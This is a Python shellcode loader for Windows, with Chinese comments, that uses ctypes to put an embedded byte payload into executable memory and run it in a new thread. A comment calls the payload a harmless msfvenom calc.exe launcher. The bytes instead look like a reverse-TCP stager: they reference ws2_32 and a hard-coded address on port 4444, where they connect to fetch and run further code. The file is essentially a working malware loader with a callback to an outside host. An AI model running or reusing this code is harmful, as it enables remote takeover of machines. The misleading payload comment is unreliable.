from ctypes import *
import ctypes

PAGE_EXECUTE_READWRITE = 0x00000040  # 区域可执行代码，可读可写
MEM_COMMIT = 0x3000  # 分配内存
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )  #给予进程所有权限

# windows api
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
CreateThread = windll.kernel32.CreateThread
WaitForSingleObject = windll.kernel32.WaitForSingleObject
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.VirtualAllocEx
WriteProcessMemory = windll.kernel32.WriteProcessMemory
CreateRemoteThread = windll.kernel32.CreateRemoteThread

# msfvenom -p windows/exec CMD='calc.exe' EXITFUNC=thread -f py
shellcode = bytearray(
b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
b"\x41\x50\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60"
b"\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
b"\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0"
b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
b"\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50"
b"\x8b\x48\x18\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49"
b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
b"\x49\xbc\x02\x00\x11\x5c\xac\x14\x0c\x05\x41\x54"
b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50"
b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00"
b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8"
b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20"
b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba"
b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00"
b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
b"\xf0\xb5\xa2\x56\xff\xd5"
)
print(shellcode)
def run1():
    VirtualAlloc.restype = ctypes.c_void_p  # 重载函数返回类型为void
    p = VirtualAlloc(c_int(0), c_int(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)  # 申请内存
    buf = (c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针
    RtlMoveMemory(c_void_p(p), buf, c_int(len(buf)))  # 复制shellcode进申请的内存中
    h = CreateThread(c_int(0), c_int(0), c_void_p(p), c_int(0), c_int(0), pointer(c_int(0)))  # 执行创建线程
    WaitForSingleObject(c_int(h), c_int(-1))

run1()
